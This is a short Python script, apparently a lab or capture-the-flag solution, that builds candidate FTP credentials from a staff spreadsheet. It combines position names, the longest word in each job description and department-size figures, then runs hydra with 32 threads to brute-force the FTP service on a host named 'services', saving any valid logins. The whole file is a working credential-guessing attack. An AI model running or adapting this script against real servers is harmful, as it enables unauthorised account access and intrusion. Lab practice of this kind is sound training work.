#!/usr/bin/python3

import subprocess
import pandas as pd

def getData():
    positionsDict = pd.read_excel('crew.xlsx', sheet_name='positions').set_index('Position').to_dict('index')
    sizeDict = pd.read_excel('crew.xlsx', sheet_name='size').set_index('Department').to_dict('index')

    longWords=list()
    position=list()
    for k,v in positionsDict.items():
        position.append(k)
        desc = v['Description']
        descList = desc.replace(',','').split(' ')
        orderedDesc = sorted(descList,key=len)
        longestWord = orderedDesc[-1]
        longWords.append(longestWord)


    totalSize = 0
    for k,v in sizeDict.items():
        totalSize += int(v['Size'])

    possCreds = list()
    for u in positionsDict:
        curDept = positionsDict[u]['Department']
        sizeDiff = totalSize - sizeDict[curDept]['Size']
        for lw in longWords:
            tmpPwd = u+lw+str(sizeDiff)
            tmpCred = curDept+':'+tmpPwd
            possCreds.append(tmpCred)

    with open('possCreds.txt','w+') as f:
        for pc in possCreds:
            f.write(pc+'\n')

    return possCreds

def bruteForce():
    res = subprocess.run(f"hydra -t 32 -C possCreds.txt services ftp -o ftpCredentials.txt",shell=True,capture_output=True).stdout.decode('utf-8')
    print(res)
    
if __name__=='__main__':
    possCreds = getData()
    bruteForce()
